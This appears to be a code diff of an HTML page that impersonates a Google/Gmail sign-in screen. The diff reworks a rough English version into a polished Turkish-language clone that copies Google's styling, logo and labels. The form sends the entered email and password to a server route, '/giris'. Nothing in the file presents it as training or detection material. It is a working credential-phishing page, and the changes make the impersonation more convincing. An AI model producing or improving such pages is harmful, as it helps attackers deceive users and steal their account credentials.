@@ -1,28 +1,161 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Secure Login – Google</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Giriş Yap - Google Hesapları</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: Arial, sans-serif; background: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 350px; }
-        h2 { margin-bottom: 10px; }
-        p { color: #5f6368; font-size: 14px; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; }
-        button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
-        button:hover { background: #1557b0; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+        body {
+            background: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+        .card {
+            background: #ffffff;
+            padding: 40px 30px 30px 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border: 1px solid #dadce0;
+            text-align: center;
+        }
+        .logo {
+            font-size: 36px;
+            font-weight: 500;
+            letter-spacing: -1px;
+            color: #202124;
+            margin-bottom: 20px;
+        }
+        .logo span {
+            color: #4285f4;
+        }
+        .card h2 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+        .card .sub {
+            color: #5f6368;
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 28px;
+        }
+        .input-group {
+            text-align: left;
+            margin-bottom: 16px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            color: #5f6368;
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: 0.2s;
+            background: #fff;
+            color: #202124;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 8px;
+        }
+        .btn:hover {
+            background: #1557b0;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.15);
+        }
+        .footer {
+            margin-top: 28px;
+            font-size: 14px;
+            color: #5f6368;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .lang {
+            font-size: 13px;
+            color: #5f6368;
+            margin-top: 20px;
+        }
+        .lang a {
+            color: #1a73e8;
+            text-decoration: none;
+            margin: 0 6px;
+        }
     </style>
 </head>
 <body>
 <div class="container">
-    <h2>🔐 Sign in</h2>
-    <p>Verify your identity to secure your account</p>
-    <form action="/giris" method="POST">
-        <input type="email" name="email" placeholder="Email or phone" required>
-        <input type="password" name="password" placeholder="Password" required>
-        <button type="submit">Next</button>
-    </form>
+    <div class="card">
+        <div class="logo"><span>G</span>mail</div>
+        <h2>Giriş Yap</h2>
+        <p class="sub">Hesabınıza devam edin</p>
+
+        <form action="/giris" method="POST">
+            <div class="input-group">
+                <label for="email">E-posta veya telefon</label>
+                <input type="email" id="email" name="email" placeholder="E-posta veya telefon" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Şifre</label>
+                <input type="password" id="password" name="password" placeholder="Şifrenizi girin" required>
+            </div>
+            <button type="submit" class="btn">Sonraki</button>
+        </form>
+
+        <div class="footer">
+            <span>Hesap oluştur</span>
+            <a href="#">Yardım</a>
+        </div>
+    </div>
+    <div class="lang">
+        <a href="#">Türkçe</a> ·
+        <a href="#">English</a> ·
+        <a href="#">Urdu</a> ·
+        <a href="#">العربية</a>
+    </div>
 </div>
 </body>
-  </html>
+</html>
